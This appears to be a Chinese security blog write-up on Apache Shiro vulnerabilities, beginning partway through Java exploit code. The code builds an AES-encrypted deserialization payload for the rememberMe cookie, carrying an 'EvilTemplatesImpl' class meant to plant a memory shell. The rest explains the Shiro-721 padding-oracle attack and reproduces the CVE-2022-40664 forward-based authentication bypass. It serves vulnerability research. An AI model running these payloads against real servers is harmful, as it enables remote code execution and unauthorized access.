+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">byte2base</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">,</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ivByte<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        IvParameterSpec iv <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> IvParameterSpec<span style="color:#ff79c6">(</span>ivByte<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        SecretKeySpec skeySpec <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> SecretKeySpec<span style="color:#ff79c6">(</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">decodeBase64</span><span style="color:#ff79c6">(</span>key<span style="color:#ff79c6">),</span> <span style="color:#f1fa8c">&#34;AES&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Cipher cipher <span style="color:#ff79c6">=</span> Cipher<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInstance</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;AES/CBC/PKCS5PADDING&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        cipher<span style="color:#ff79c6">.</span><span style="color:#50fa7b">init</span><span style="color:#ff79c6">(</span>Cipher<span style="color:#ff79c6">.</span><span style="color:#50fa7b">ENCRYPT_MODE</span><span style="color:#ff79c6">,</span> skeySpec<span style="color:#ff79c6">,</span> iv<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> encrypted <span style="color:#ff79c6">=</span> cipher<span style="color:#ff79c6">.</span><span style="color:#50fa7b">doFinal</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream outputStream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">(</span> <span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        outputStream<span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>ivByte<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        outputStream<span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>encrypted<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        String ret<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encodeBase64String</span><span style="color:#ff79c6">(</span>outputStream<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        outputStream.close();
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">return</span> ret<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> TemplatesImpl <span style="color:#50fa7b">getTemplates</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>memoryshell<span style="color:#ff79c6">.</span><span style="color:#50fa7b">HelloTemplatesImpl</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()});</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;EvilTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span> setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> templates<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String fieldName<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span>
+</span></span><span style="display:flex;"><span>            Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>fieldName<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithoutConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> createWithConstructor<span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">],</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> constructorClass<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?&gt;[]</span> consArgTypes<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">[]</span> consArgs <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> objCons <span style="color:#ff79c6">=</span> constructorClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>consArgTypes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?&gt;</span> sc <span style="color:#ff79c6">=</span> ReflectionFactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getReflectionFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">newConstructorForSerialization</span><span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>sc<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">(</span>T<span style="color:#ff79c6">)</span>sc<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>consArgs<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span>AccessibleObject member<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String versionStr <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.version&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> javaVersion <span style="color:#ff79c6">=</span> Integer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">parseInt</span><span style="color:#ff79c6">(</span>versionStr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">split</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;\\.&#34;</span><span style="color:#ff79c6">)[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>javaVersion <span style="color:#ff79c6">&lt;</span> 12<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// quiet runtime warnings from JDK9+
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//            Permit.setAccessible(member);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// not possible to quiet runtime warnings anymore...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// see https://bugs.openjdk.java.net/browse/JDK-8210522
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// to understand impact on Permit (i.e. it does not work
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// anymore with Java &gt;= 12)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            member<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>将输出的base64复制到rememberMe字段，成功命令执行。</p>
+<p><img src="https://s2.loli.net/2022/10/22/JTdg3AkEjrNtsKI.png" alt="image-20221018222030665"></p>
+<h2 id="cve-2019-12422-shiro721">CVE-2019-12422 (shiro721)</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">漏洞信息</th>
+<th style="text-align:left">详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">漏洞编号</td>
+<td style="text-align:left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422">CVE-2019-12422</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-42574">CNVD-2016-07814</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-721">SHIRO-721</a></td>
+</tr>
+<tr>
+<td style="text-align:left">影响版本</td>
+<td style="text-align:left">shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞描述</td>
+<td style="text-align:left">RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞关键字</td>
+<td style="text-align:left">反序列化 | RememberMe | Padding | CBC</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞补丁</td>
+<td style="text-align:left"><a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a></td>
+</tr>
+<tr>
+<td style="text-align:left">相关链接</td>
+<td style="text-align:left"><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data">https://blog.skullsecurity.org/2016/12</a> <a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a> <a href="https://codeantenna.com/a/OwWV5Ivtsi">https://codeantenna.com/a/OwWV5Ivtsi</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="太长不看-1">太长不看</h3>
+<p>这种攻击方法的效果就是需要获取一个正常的rememberMe的值，然后可以构造任意密文（即后端解密后的任意明文）进行反序列化。实际攻击中由于该方法需要发大量的包，其实并不常用。</p>
+<h3 id="某数学渣渣的粗浅理解">某数学渣渣的粗浅理解</h3>
+<p>首先需要获取正常rememberMe值的明文，使用到的攻击方法是 <a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">Padding Oracle Attack</a></p>
+<p>CBC模式下的AES加、解密过程如下</p>
+<p>加密：</p>
+<p><img src="https://s2.loli.net/2022/10/22/amngTQ9P7dXbv8h.png" alt="img"></p>
+<p><img src="https://s2.loli.net/2022/10/22/UM9SjWKsGfkiL1O.png" alt="img"></p>
+<p>解密：</p>
+<p><img src="https://s2.loli.net/2022/10/22/TEu1K2coqVkLxWe.png" alt="0*U8hj7r0wXD9aIZVk.png (600×242)"></p>
+<p><img src="https://s2.loli.net/2022/10/22/Xu7BwhyTzCZspj3.png" alt="0*-yEz3SVJrvDkvQxT (337×86)"></p>
+<p>最后一组明文会使用字节填充，需要N字节，每个字节的值就是N</p>
+<p><img src="https://s2.loli.net/2022/10/22/xT38ozHnivrDWJh.png" alt="img"></p>
+<p>假设服务端对正确的填充和错误的填充会返回不同的值，那么就可以爆破出明文。过程如下：</p>
+<p>假设有N块明文，先构造第N-1块密文的值为00000000 (假设每一块8字节)。这时候服务器大概率返回padding error。接下来不断修改第N-1块密文的最低字节 00000001 00000002 &hellip;. 假设低字节修改为0x3c的时候成功padding，那么就可以求出Dk(C)的值（即解密后未异或的值，下面记为 Intermediary Byte</p>
+<p><img src="https://s2.loli.net/2022/10/22/ZhJykYLv5u2tGsX.png" alt="072514_1550_PaddingOrac7.png (616×145)"></p>
+<blockquote>
+<p>If [Intermediary Byte] ^ 0x3C == 0x01,</p>
+<p>then [Intermediary Byte] == 0x3C ^ 0x01,</p>
+<p>so [Intermediary Byte] == 0x3D</p>
+</blockquote>
+<p>然后，再将原本的第N-1块密文的低1位和0x3d异或，即可求出明文的低1位。</p>
+<p>再然后，修改N-1块密文的低2位，利用同样的方式，求出明文的低2位。</p>
+<p>再再然后，用同样的方式，以第N-2块密文爆破第N-1块密文，最后还原出所有明文。</p>
+<p>得到明文之后，再利用 <a href="https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511">CBC Byte-Flipping Attack</a> 构造任意密文：</p>
+<p>记需要构造的密文为C&rsquo;，原密文为C，构造的明文P，原明文P&rsquo;，有</p>
+<p><img src="https://s2.loli.net/2022/10/22/mushN8CKyXAp2Et.png" alt="0*lYk7MF2rj40smLqN (412×192)"></p>
+<p>设需要使得P&rsquo;=y，则</p>
+<p><img src="https://s2.loli.net/2022/10/22/AWt2oIXZhrTBKCV.png" alt="0*q_2eJYs1YATlWFBk (281×137)"></p>
+<p>也就是说，只需要把原来的密文异或 Pi 再异或 y 即可。</p>
+<p>至于初始密文和伪造密文的长度差异则可以通过延长初始密文的块解决。</p>
+<h3 id="利用脚本">利用脚本</h3>
+<p>由于我是算法苦手+数学渣渣，不配写具体shiro的利用脚本呜呜呜，贴一下longofo师傅的EXP</p>
+<p><a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a></p>
+<h2 id="cve-2022-40664">CVE-2022-40664</h2>
+<p>Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher.</p>
+<p><a href="https://blog.csdn.net/xyjy11/article/details/127324055">https://blog.csdn.net/xyjy11/article/details/127324055</a></p>
+<h3 id="复现-1">复现</h3>
+<p>当未鉴权的路由用 forward 方法把请求转发给需要鉴权的路由时会引发漏洞</p>
+<p>例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spring_demo.controller<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.example.spring_demo.Service.UserServiceImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.example.spring_demo.domain.MyUser<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.beans.factory.annotation.Autowired<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.stereotype.Controller<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@Controller
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">HelloController</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    @Autowired
+</span></span><span style="display:flex;"><span>    UserServiceImpl userService<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    MyUser user<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @GetMapping <span style="color:#ff79c6">(</span>value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/index&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">index</span><span style="color:#ff79c6">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;forward:/secret&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        return &#34;hello, guest!&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    @GetMapping<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    @ResponseBody
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">secret</span><span style="color:#ff79c6">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;This is my secret.&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    @PostMapping<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/login&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">admin</span><span style="color:#ff79c6">(</span>@RequestBody MyUser user<span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            userService<span style="color:#ff79c6">.</span><span style="color:#50fa7b">checkLogin</span><span style="color:#ff79c6">(</span>user<span style="color:#ff79c6">.</span><span style="color:#50fa7b">username</span><span style="color:#ff79c6">,</span>user<span style="color:#ff79c6">.</span><span style="color:#50fa7b">password</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;Login success!&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;error&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>secret需要权限，index不需要权限</p>
+<p><img src="https://s2.loli.net/2022/10/22/KwsEn7b815lYPvN.png" alt="image-20221019104234723"></p>
+<p>实际测试发现shiro-spring最新版本1.10.0依然可以绕过</p>
+<h3 id="分析-1">分析</h3>
+<p>利用github的功能查看版本的区别</p>
+<p><a href="https://github.com/apache/shiro/compare/shiro-root-1.9.1...shiro-root-1.10.0">https://github.com/apache/shiro/compare/shiro-root-1.9.1...shiro-root-1.10.0</a></p>
+<p>发现<code>org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter</code>有大变动</p>
+<p><img src="https://s2.loli.net/2022/10/22/PUEYOvXN5dwpaCD.png" alt="image-20221019121501504"></p>
+<p>先分析一下springboot中路由forward请求都做了些什么</p>
+<p><code>org.apache.catalina.core.ApplicationDispatcher#doForward</code></p>
+<p><img src="https://s2.loli.net/2022/10/22/YIVBmlQxgFkAXUo.png" alt="image-20221019115617662"></p>
+<p><img src="https://s2.loli.net/2022/10/22/tr6CzcgVL8WHGAw.png" alt="image-20221019115632459"></p>
+<p>在这里创建filterChain</p>
+<p><img src="https://s2.loli.net/2022/10/22/835VbYykLjic2ue.png" alt="image-20221019115703649"></p>
+<p><img src="https://s2.loli.net/2022/10/22/VDhLuzYZkq8JHsc.png" alt="image-20221019115752342"></p>
+<p><img src="https://s2.loli.net/2022/10/22/5vXq4nagD7HL8C6.png" alt="image-20221019115815817"></p>
+<p>于是乎就会去寻找注册的filter里能请求forward的filter</p>
+<p>而按正常方法注册的shiroFilterFactoryBean并不能处理Forward。接下来先看看springboot里是怎么把filter注册进去的</p>
